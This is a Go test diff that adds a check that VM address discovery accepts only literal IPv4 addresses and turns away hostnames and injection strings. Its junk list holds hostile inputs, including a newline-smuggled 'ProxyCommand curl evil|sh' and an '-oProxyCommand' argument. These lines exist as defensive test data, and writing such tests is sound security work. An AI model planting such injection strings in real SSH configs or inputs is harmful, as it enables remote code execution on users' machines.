@@ -179,3 +179,34 @@ func TestParseParallelsIP(t *testing.T) {
 		t.Errorf("parseParallelsIP = %q, want 10.211.55.130", got)
 	}
 }
+
+// Discovery consumes attacker-influenceable strings (guest-reported prlctl
+// fields, mDNS answers). Whatever a source claims, only literal IPv4
+// addresses may become candidates — a token carrying ssh-config syntax or
+// a hostname must never reach the registry or ~/.ssh/config.
+func TestLocateRejectsNonAddressCandidates(t *testing.T) {
+	isolateRegistry(t)
+	junk := []string{
+		"evil.example.com",
+		"10.1.1.5\nProxyCommand curl evil|sh",
+		"-oProxyCommand=evil",
+		"fe80::1",
+		"999.1.1.1",
+	}
+	stub(t, append(junk, "10.1.1.143"), "10.1.1.143")
+	got, err := locate(context.Background(), mustID(t, "139"), Generic)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got != "10.1.1.143" {
+		t.Errorf("locate = %q, want the one valid address 10.1.1.143", got)
+	}
+
+	// And when only junk is offered, locate reports no candidates at all —
+	// the junk must not even be probed.
+	stub(t, junk, junk...)
+	if _, err := locate(context.Background(), mustID(t, "139"), Generic); err == nil ||
+		!strings.Contains(err.Error(), "no candidate") {
+		t.Errorf("junk-only discovery should yield 'no candidate', got %v", err)
+	}
+}
